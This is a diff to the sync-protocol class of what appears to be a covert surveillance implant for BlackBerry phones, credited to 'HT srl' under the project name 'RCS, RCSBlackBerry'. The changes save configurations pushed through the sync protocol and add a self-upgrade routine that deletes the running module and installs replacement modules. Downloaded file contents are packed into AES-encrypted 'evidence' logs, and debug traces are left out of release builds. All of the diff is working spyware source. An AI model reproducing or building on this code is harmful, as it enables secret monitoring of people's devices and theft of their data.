@@ -1,20 +1,26 @@
 //#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2011
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
+	
 package blackberry.action.sync;
 
 import java.util.Date;
 import java.util.Enumeration;
+import java.util.Vector;
 
 import javax.microedition.io.file.FileSystemRegistry;
 
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.Status;
 import blackberry.action.sync.protocol.CommandException;
-import blackberry.action.sync.protocol.Proto;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.transport.Transport;
 import blackberry.config.Conf;
-import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -49,19 +55,22 @@ public abstract class Protocol {
 
     public abstract boolean perform() throws ProtocolException;
 
-    public static boolean saveNewConf(byte[] conf, int offset)
+    public synchronized static boolean saveNewConf(byte[] conf, int offset)
             throws CommandException {
-        final AutoFlashFile file = new AutoFlashFile(Conf.NEW_CONF_PATH
-                + Conf.NEW_CONF, true);
-
-        if (file.exists()) {
-            file.delete();
-        }
+        final AutoFlashFile file = new AutoFlashFile(Path.USER()
+                + Path.CONF_DIR + Conf.NEW_CONF, true);
 
         file.create();
         final boolean ret = file.write(conf, offset, conf.length - offset);
         if (!ret) {
+            //#ifdef DEBUG
+            debug.error("saveNewConf: cannot write on file: "
+                    + file.getFullFilename());
+            //#endif
+            
             throw new CommandException(); //"write"
+        }else{
+            Evidence.info("New configuration received");
         }
 
         return ret;
@@ -84,11 +93,60 @@ public abstract class Protocol {
         debug.trace("file written: " + file.exists());
         //#endif
 
-        if (filename.equals(Protocol.UPGRADE_FILENAME_0)
-                || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
-            upgradeMulti();
-        }
+    }
 
+    public static boolean upgradeMulti(Vector files) {
+
+        try {
+            AutoFlashFile[] autoFiles = new AutoFlashFile[files.size()];
+            // guarda se i file ci sono tutti e sono capienti e leggibili
+            for (int i = 0; i < files.size(); i++) {
+                String file = (String) files.elementAt(i);
+                AutoFlashFile autoFile = new AutoFlashFile(file);
+                autoFiles[i] = autoFile;
+
+                if (!autoFile.exists() || !autoFile.isReadable()
+                        || autoFile.getSize() <= 0) {
+                    //#ifdef DEBUG
+                    debug.error("upgradeMulti, file does not exist: " + file);
+                    //#endif
+                }
+            }
+
+            // cancella se stesso
+            deleteSelf();
+
+            // upgrade effettivo
+            for (int i = 0; i < autoFiles.length; i++) {
+                AutoFlashFile autoFlashFile = autoFiles[i];
+
+                //#ifdef DEBUG
+                debug.trace("upgrading: " + autoFlashFile.getFullFilename());
+                //#endif
+                upgradeCod(autoFlashFile.read());
+                autoFlashFile.delete();
+            }
+
+            // restart the blackberry if required
+            if (CodeModuleManager.isResetRequired()) {
+                //#ifdef DEBUG
+                CodeModuleManager.promptForResetIfRequired();
+                //#endif
+                //#ifdef DEBUG
+                debug.warn("Reset required");
+                //#endif
+            }
+
+            //#ifdef DEBUG
+            debug.info("Upgrade REQUEST");
+            //#endif
+            return true;
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.info("Upgrade FAILED");
+            //#endif
+            return false;
+        }
     }
 
     public static boolean upgradeMulti() {
@@ -99,13 +157,23 @@ public abstract class Protocol {
 
         if (file_0.exists() && file_1.exists()) {
             //#ifdef DEBUG
-            debug.trace("upgradeMulti: both file present");            
+            debug.trace("upgradeMulti: both file present");
             //#endif                        
-            
+
             deleteSelf();
-            upgradeCod(file_0.read(), Protocol.UPGRADE_FILENAME_0);
-            upgradeCod(file_1.read(), Protocol.UPGRADE_FILENAME_1);
-            
+
+            //#ifdef DEBUG
+            debug.trace("upgrading: " + Protocol.UPGRADE_FILENAME_0);
+            //#endif
+
+            upgradeCod(file_0.read());
+
+            //#ifdef DEBUG
+            debug.trace("upgrading: " + Protocol.UPGRADE_FILENAME_0);
+            //#endif
+
+            upgradeCod(file_1.read());
+
             file_0.delete();
             file_1.delete();
 
@@ -120,15 +188,15 @@ public abstract class Protocol {
             }
 
             return true;
-        }else{
+        } else {
             //#ifdef DEBUG
             debug.trace("upgradeMulti: not both.");
             //#endif
             return false;
         }
     }
-    
-    public static boolean deleteSelf(){
+
+    public static boolean deleteSelf() {
         // Delete it self.
         final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
         if (handle != 0) {
@@ -142,7 +210,7 @@ public abstract class Protocol {
         }
     }
 
-    public static boolean upgradeCod(byte[] codBuff, String module_name) {
+    public static boolean upgradeCod(byte[] codBuff) {
 
         if (Utils.isZip(codBuff)) {
             //#ifdef DEBUG
@@ -151,10 +219,6 @@ public abstract class Protocol {
             return false;
         }
 
-        //#ifdef DEBUG
-        debug.trace("upgrading: " + module_name);
-        //#endif
-       
         // Download new cod files(included sibling files).
 
         int newHandle = 0;
@@ -254,6 +318,7 @@ public abstract class Protocol {
         byte[] content = file.read();
         byte[] additional = Protocol.logDownloadAdditional(filename);
         Evidence log = new Evidence(false, Encryption.getKeys().getAesKey());
+
         log.createEvidence(additional, EvidenceType.DOWNLOAD);
         log.writeEvidence(content);
         log.close();
